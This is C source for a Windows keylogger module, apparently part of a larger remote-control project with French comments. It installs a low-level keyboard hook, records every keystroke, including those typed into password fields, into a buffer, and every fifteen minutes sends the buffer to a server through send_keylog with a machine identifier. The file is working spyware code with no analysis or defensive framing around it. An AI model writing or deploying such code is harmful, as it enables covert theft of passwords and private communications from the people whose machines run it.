#include "keylogger.h"
#include "../network/communication.h"
#include "../config.h"
#include <windows.h>
#include <stdio.h>
#include <string.h>

#define KEYLOG_BUFFER_SIZE (LARGE_BUFFER * 4)
#define SEND_INTERVAL_MS   (15 * 60 * 1000)   /* 15 minutes */

static HHOOK   g_hook      = NULL;
static HANDLE  g_mutex     = NULL;
static HANDLE  g_thread    = NULL;
static volatile int g_running = 0;
static int     g_machine_id   = 0;

static char   g_buffer[KEYLOG_BUFFER_SIZE];
static size_t g_buf_len = 0;

/* Callback appelé à chaque frappe clavier */
static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;
        char key[32] = {0};

        switch (kb->vkCode) {
            case VK_RETURN:  strcpy(key, "[ENTER]\n"); break;
            case VK_BACK:    strcpy(key, "[BACK]");    break;
            case VK_SPACE:   strcpy(key, " ");          break;
            case VK_TAB:     strcpy(key, "[TAB]");      break;
            case VK_SHIFT:
            case VK_LSHIFT:
            case VK_RSHIFT:
            case VK_CONTROL:
            case VK_MENU:    break; /* on ignore les modificateurs seuls */
            default: {
                BYTE state[256];
                GetKeyboardState(state);
                WCHAR wch[4] = {0};
                if (ToUnicode(kb->vkCode, kb->scanCode, state, wch, 4, 0) == 1)
                    WideCharToMultiByte(CP_UTF8, 0, wch, 1, key, sizeof(key), NULL, NULL);
                break;
            }
        }

        if (key[0]) {
            WaitForSingleObject(g_mutex, INFINITE);
            size_t klen = strlen(key);
            if (g_buf_len + klen < KEYLOG_BUFFER_SIZE - 1) {
                memcpy(g_buffer + g_buf_len, key, klen);
                g_buf_len += klen;
                g_buffer[g_buf_len] = '\0';
            }
            ReleaseMutex(g_mutex);
        }
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

/* Envoie le contenu du buffer au serveur et le vide */
static void flush_buffer(void) {
    WaitForSingleObject(g_mutex, INFINITE);
    if (g_buf_len > 0) {
        send_keylog(g_machine_id, g_buffer);
        g_buf_len    = 0;
        g_buffer[0]  = '\0';
    }
    ReleaseMutex(g_mutex);
}

/* Thread principal du keylogger */
static DWORD WINAPI KeylogThread(LPVOID param) {
    (void)param;
    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!g_hook) return 1;

    DWORD last_send = GetTickCount();
    MSG msg;

    while (g_running) {
        /* La message pump est obligatoire pour que le hook low-level fonctionne */
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        if (GetTickCount() - last_send >= SEND_INTERVAL_MS) {
            flush_buffer();
            last_send = GetTickCount();
        }

        Sleep(10);
    }

    UnhookWindowsHookEx(g_hook);
    g_hook = NULL;
    return 0;
}

void start_keylogger(int machine_id) {
    if (g_running) return;
    g_machine_id = machine_id;
    g_buf_len    = 0;
    g_buffer[0]  = '\0';
    g_mutex      = CreateMutex(NULL, FALSE, NULL);
    g_running    = 1;
    g_thread     = CreateThread(NULL, 0, KeylogThread, NULL, 0, NULL);
}

void stop_keylogger(void) {
    if (!g_running) return;
    g_running = 0;
    if (g_thread) {
        WaitForSingleObject(g_thread, 5000);
        CloseHandle(g_thread);
        g_thread = NULL;
    }
    flush_buffer(); /* envoie ce qui reste dans le buffer */
    if (g_mutex) {
        CloseHandle(g_mutex);
        g_mutex = NULL;
    }
}
